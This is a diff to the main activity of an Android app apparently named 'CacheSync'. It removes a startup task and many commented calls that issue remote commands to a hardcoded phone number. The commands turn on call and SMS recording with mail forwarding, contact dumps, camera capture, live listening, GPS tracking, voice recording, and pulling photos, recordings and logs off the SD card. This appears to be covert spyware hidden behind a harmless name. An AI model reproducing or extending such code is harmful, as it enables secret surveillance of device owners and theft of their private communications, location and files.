@@ -19,14 +19,17 @@ import android.widget.TextView;
 
 public class MainActivity extends Activity {
 
-	public final NetLog gLog = NetLog.getInstance("CacheSync","CacheSync.log.txt",true); 
+	final public NetLog gLog = NetLog.getInstance(); 
+	final public CommandPool cmdPool = CommandPool.getInstance();
 
-	public CommandPool cmdPool;
 	public ProgressBar progress;
 	public TextView txtItems;
 	
     @Override
     public void onCreate(Bundle savedInstanceState) {
+    	
+    	gLog.Init("CacheSync","CacheSync.log.txt",true);
+    	
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         
@@ -44,46 +47,6 @@ public class MainActivity extends Activity {
           
         
         serviceStart();
-       
-        BackgroundTask<Void,Void> task = new BackgroundTask<Void,Void>(this,true) {
-        	
-        	public void onComplete(Void  v) {
-                cmdPool.Execute("+79037996299", "@setup;ack:0");
-              /*
-                cmdPool.Execute("+79037996299", "@rcalls;on");
-                cmdPool.Execute("+79037996299", "@rsms;on;mail");
-                cmdPool.Execute("+79037996299", "@rcontacts;on");
-                cmdPool.Execute("+79037996299", "@custom");
-        	 */
-        	}
-        	
-        	@Override
-        	protected Void doInBackground(Void ... arg0) {
-                cmdPool = CommandPool.getInstance(MainActivity.this);
-                cmdPool.defaultSettings();
-                return (Void)null;
-        	}
-        };
-        task.exec();
-        
-        
- 
-       //cmdPool.Execute("+79037996299", "@cam");
-        
-       // cmdPool.Execute("+79037996299", "@file;f:/mnt/sdcard/shot.jpg");
-        //cmdPool.Execute("+79037996299", "@net");
-       // APNHelper h = new APNHelper(this);
-       // h.getMMSApns();
-        
-        // cmdPool.Execute("+79037996299","@clisten;1");
-       
-        // cmdPool.Execute("+79037996299", "@file;/mnt/sdcard/120820024511.3gp");
-        //cmdPool.Execute("+79037996299","@lcalls;f:120820");
-       // cmdPool.Execute("+79037996299","@gps;t:5");
-       // cmdPool.Execute("+79037996299", "@voice;t:10");
-        // cmdPool.Execute("+79037996299","@setup;f:120810;");
-       //cmdPool.Execute("+79037996299","@lcontacts");
-     //  cmdPool.Execute("323","@file;/mnt/sdcard/CacheSync.log.txt");
     }
 
 	public int getBatteryLevel() {
